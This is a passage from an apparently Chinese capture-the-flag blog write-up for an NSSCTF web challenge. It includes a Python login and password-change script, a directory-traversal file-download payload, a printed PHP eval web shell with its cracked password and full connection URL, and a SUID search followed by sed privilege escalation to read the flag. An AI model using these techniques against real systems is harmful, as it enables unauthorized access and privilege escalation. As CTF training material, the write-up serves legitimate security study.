url1<span class="token operator">=</span><span class="token string">"http://node4.anna.nssctf.cn:28937/?c=app&amp;m=login"</span>
name<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
password <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token string">b'123456'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
pass2<span class="token operator">=</span>md5<span class="token punctuation">(</span><span class="token string">b'root'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
url2<span class="token operator">=</span><span class="token string">"http://node4.anna.nssctf.cn:28937?c=admin&amp;m=updatePass"</span>
name2<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sess<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
res1<span class="token operator">=</span>sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span>name<span class="token punctuation">,</span><span class="token string">"pass"</span><span class="token punctuation">:</span>password<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res1<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
res2<span class="token operator">=</span>sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url2<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span>name2<span class="token punctuation">,</span>
                              <span class="token string">"newPass"</span><span class="token punctuation">:</span>pass2<span class="token punctuation">,</span>
                              <span class="token string">"oldPass"</span><span class="token punctuation">:</span>password<span class="token punctuation">,</span>
                              <span class="token string">"saying"</span><span class="token punctuation">:</span><span class="token string">"yes"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后成功登录，发现一个能够下载日志的功能</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102111143488.png" alt="image-20231102111143488"></p>
<p>点击下载，抓包发现一个任意文件下载的参数filename</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102111635902.png" alt="image-20231102111635902"></p>
<h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>结合我们前面扫目录扫出来的几个路由，下载phpinfo.php，注意要进行目录穿越</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>root<span class="token operator">&amp;</span>m<span class="token operator">=</span>downloadRequestLog<span class="token operator">&amp;</span>filename<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>phpinfo<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>phpinfo.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass_31d5df001717'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'3fde6bb0541387e4ebdadf7c2ff31123'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> 
<span class="token comment">// hint: Checker will not detect the existence of phpinfo.php, please delete the file when fixing the vulnerability.</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>是md5强比较，直接爆破解密：<a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
<p>明文为1q2w3e</p>
<p>然后就拿到shell了</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102112426852.png" alt="image-20231102112426852"></p>
<p>flag在根目录下，但是我们好像读不到，连上蚁剑看看</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//node4.anna.nssctf.cn:28468/phpinfo.php?pass_31d5df001717=1q2w3e&amp;cc=eval($_POST[cmd]);</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>密码cmd</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102112715279.png" alt="image-20231102112715279"></p>
<p>权限不足，看来需要提权</p>
<h2 id="sed提权"><a href="#sed提权" class="headerlink" title="sed提权"></a>sed提权</h2><p>先搜索SUID file</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> /4000 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>解释一下：</p>
<ol>
<li>首先在根目录下查找普通文档</li>
<li>查找系统所有文件中拥有suid特殊权限的文件</li>
<li>2表示标准错误流</li>
<li>“&gt;”符号称为文件重定向运算符。其目的是将左侧的内容定向到右侧的命令</li>
<li>将错误信息丢到<code>/dev/null</code>文件中，即不显示目前权限不够的信息</li>
</ol>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102112939341.png" alt="image-20231102112939341"></p>
<p>然后翻GTFOBins找对应的提权方法：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<p>测试发现环境中没有sudo，只有sed命令的提权方式能用</p>
<p>读flag即可</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">''</span> <span class="token string">"/flag"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>